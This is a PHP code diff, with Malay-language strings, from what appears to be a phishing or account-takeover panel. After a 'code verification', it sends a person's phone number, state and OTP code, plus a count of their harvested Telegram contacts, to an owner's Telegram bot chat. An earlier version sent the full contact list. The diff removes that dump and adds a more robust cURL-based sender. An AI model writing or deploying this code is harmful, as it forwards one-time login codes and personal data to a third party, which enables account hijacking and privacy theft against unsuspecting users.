@@ -58,16 +58,7 @@ if (!is_array($contacts)) {
     $contacts = [];
 }
 
-$contactLines = [];
-foreach ($contacts as $index => $contact) {
-    $name = trim(($contact['first_name'] ?? '') . ' ' . ($contact['last_name'] ?? ''));
-    $phone = $contact['phone'] ?? '-';
-    $telegramId = $contact['telegram_id'] ?? '-';
-    $username = ($contact['username'] ?? '') !== '' ? '@' . $contact['username'] : '-';
-    $contactLines[] = ($index + 1) . ". $name | $phone | $telegramId | $username";
-}
-
-$contactText = count($contactLines) > 0 ? "\n\nSenarai Contact Telegram:\n" . implode("\n", $contactLines) : "\n\nTiada contact Telegram disimpan.";
+$contactCount = count($contacts);
 
 $token = getenv('TELEGRAM_BOT_TOKEN') ?: '';
 $chat_id = getenv('TELEGRAM_ADMIN_CHAT_ID') ?: getenv('TELEGRAM_CHAT_ID') ?: '';
@@ -90,34 +81,56 @@ $message = "Pengesahan Kod Berjaya\n\n" .
     "Telefon: $telefon\n" .
     "Negeri: $negeri\n" .
     "Kod OTP: $otp\n" .
-    "Jumlah Contact tersimpan: " . count($contacts) . "\n\n" .
-    "Login disimpan di Senarai Login admin.\n" .
-    $contactText;
+    "Jumlah Contact tersimpan: " . $contactCount . "\n\n" .
+    "Login disimpan di Senarai Login admin.";
 
-$url = "https://api.telegram.org/bot$token/sendMessage";
-$options = [
-    'http' => [
-        'header' => "Content-Type: application/json\r\n",
-        'method' => 'POST',
-        'content' => json_encode([
-            'chat_id' => $chat_id,
-            'text' => $message
-        ])
-    ]
-];
+function sendTelegramMessage($token, $chat_id, $text) {
+    $url = "https://api.telegram.org/bot$token/sendMessage";
+    $payload = json_encode([
+        'chat_id' => $chat_id,
+        'text' => $text
+    ]);
 
-if ($chat_id !== '') {
-    $response = @file_get_contents($url, false, stream_context_create($options));
-    if ($response === false) {
-        http_response_code(500);
-        echo json_encode(['success' => false, 'error' => 'Gagal menghantar notifikasi ke Telegram owner.']);
-        exit;
+    if (function_exists('curl_version')) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+        $response = curl_exec($ch);
+        $error = curl_error($ch);
+        curl_close($ch);
+        if ($response === false) {
+            return ['ok' => false, 'error' => 'cURL error: ' . $error];
+        }
+    } else {
+        $options = [
+            'http' => [
+                'header' => "Content-Type: application/json\r\n",
+                'method' => 'POST',
+                'content' => $payload,
+                'timeout' => 20
+            ]
+        ];
+        $response = @file_get_contents($url, false, stream_context_create($options));
+        if ($response === false) {
+            return ['ok' => false, 'error' => 'HTTP request failed (allow_url_fopen mungkin dimatikan).'];
+        }
     }
 
     $result = json_decode($response, true);
-    if (!isset($result['ok']) || $result['ok'] !== true) {
+    if (!is_array($result)) {
+        return ['ok' => false, 'error' => 'Respons Telegram tidak sah: ' . substr($response, 0, 200)];
+    }
+    return $result;
+}
+
+if ($chat_id !== '') {
+    $telegramResult = sendTelegramMessage($token, $chat_id, $message);
+    if (!isset($telegramResult['ok']) || $telegramResult['ok'] !== true) {
         http_response_code(500);
-        echo json_encode(['success' => false, 'error' => 'Telegram mengembalikan ralat: ' . ($result['description'] ?? 'unknown')]);
+        echo json_encode(['success' => false, 'error' => 'Telegram mengembalikan ralat: ' . ($telegramResult['description'] ?? $telegramResult['error'] ?? 'unknown')]);
         exit;
     }
 }
